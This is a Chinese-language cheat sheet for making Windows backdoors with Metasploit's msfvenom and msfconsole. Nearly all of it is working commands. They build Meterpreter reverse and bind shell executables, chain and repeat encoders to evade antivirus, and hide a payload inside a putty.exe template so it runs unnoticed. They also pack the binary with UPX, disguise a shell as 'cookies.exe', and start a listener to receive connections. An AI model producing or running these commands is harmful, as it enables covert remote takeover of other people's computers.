Metasploit后门生成

帮助说明

root@kalibook:~# msfvenom -h
Error: MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>

Options:
    -p, --payload       <payload>    需要使用的攻击载荷，若需要自定义payload则使用-或者stdin指定
        --payload-options            列出所有攻击载荷的标准选项
    -l, --list          [type]       列出所有模块类型，可用的模块有payloads, encoders, nops, all
    -n, --nopsled       <length>     在payload上指定NOPs的滑动长度
    -f, --format        <format>     输出载荷的格式，可以使用--help-formats列出所有可用格式
        --help-formats               列出所有可用格式
    -e, --encoder       <encoder>    指定使用哪种编码器
    -a, --arch          <arch>       指定payload的目标架构
        --platform      <platform>   指定payload的目标平台
        --help-platforms             列出所有可用的平台列表
    -s, --space         <length>     设定payload的最大长度
    -b, --bad-chars     <list>       设定规避字符集，如：'\x00\xff'
    -i, --iterations    <count>      设定payload的编码次数
    -c, --add-code      <path>       指定一个附加的win32 shellcode文件
    -x, --template      <path>       指定一个自定义的可执行程序作为模板
    -k, --keep                       保护模板程序的动作（正常运行）且注入payload做为一个新的线程运行
    -o, --out           <path>       指定输出位置
    -v, --var-name      <name>       自定义变量以确定输出格式
        --smallest                   尽可能小的生成payload

基本使用

# -p 指定payload
# -f 指定输出格式
# -o 指定输出位置
# lhost payload参数，指定反向连接服务端地址
# lport payload参数，指定反向连接服务端端口
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.137 lport=4444 -f exe -o a.exe

# 结合编码器生成后门
#  -e 指定编码器
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f exe -o a.exe

# 对编码器多次编码
#  -i <num> 编码次数
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3  -f exe -o a.exe

# 规避字符集
#  -b 设定规避字符集
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -b '\x00' -f exe -o a.exe

# 使用自定义程序模板，默认使用的是msf/data/templates下的模板
#  -x 模板程序
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -x /root/temporary/putty.exe -f exe > a.exe

# 使用自定义程序模板，隐秘的启动攻击载荷
# -k 配置攻击载荷在独立的线程中启动，不影响宿主程序的运行
msfvenom -p windows/meterpreter/bind_tcp -x /root/temporary/putty.exe -k -f exe > a.exe

#  编码链，结合多种编码器对payload进行编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe

# 加壳
upx -5 /root/Desktop/payload.exe

# 查看所有linux可用的payload
msfvenom -l payloads | grep linux

# 查看所有windows可用的payload
msfvenom -l payloads | grep windows

# 查看所有支持的输出格式
msfvenom --help-formats

# 查看所有可用的编码器
msfvenom -l encoders

Win32 shellcode追加-c

# 生成一个弹出消息的payload，消息的内容是How are you?，TEXT是payload的参数
msfvenom -a x86 --platform windows -p windows/messagebox TEXT="How are you?" -f raw > messageBox

# 生成一个弹出消息的payload，消息的内容是Fine, thank you。并且使用-c追加上面生成的shellcode
msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="Fine, thank you" -f raw > messageBox2

# 生产后门shell的payload，使用上面生成的shellcode
msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe

# 运行的结果是：弹出两次提示信息，后台执行反向shell

msfconsole控制台生成

msf > use exploit/multi/handler # 启动反向服务端
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp # 设置payload
msf exploit(handler) > set LHOST 192.168.155.146 # 设置服务端IP
msf exploit(handler) > set LPORT 4444 # 设置服务端端口
msf exploit(handler) > exploit -j # 调入后台执行服务端

msf exploit(handler) > use payload/windows/meterpreter/reverse_tcp # 设置客户端payload
msf payload(reverse_tcp) > set LHOST 192.168.155.146 # 设置后门程序客户端连接的服务端IP
msf payload(reverse_tcp) > set LPORT 4444 # 设置后门程序客户端连接的服务端端口
msf payload(reverse_tcp) > generate -t exe -p windows -f /root/backdoor.exe # 生成客户端后门程序
msf payload(reverse_tcp) > jobs # 查看下反向服务端接受任务是否已经在后台执行
